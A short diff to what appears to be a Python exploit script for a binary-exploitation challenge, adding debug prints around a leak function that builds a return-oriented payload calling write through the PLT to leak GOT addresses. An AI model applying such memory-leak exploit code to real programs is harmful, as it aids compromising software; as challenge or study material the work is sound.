@@ -32,7 +32,7 @@ def leak(p, function_got: int) -> int:
     payload += p64(0)
     payload += p64(write_plt)
     payload += p64(main_addr)
-
+    print (payload)
     p.sendlineafter(b'> ', b'1')
     p.sendlineafter(b'>> ', payload)
     p.recvline()
@@ -43,6 +43,8 @@ def leak(p, function_got: int) -> int:
 
 def main():
     p = get_process()
+    print ("Get processes")
+    print (p)
 
     write_got   = 0x404018
     read_got    = 0x404020
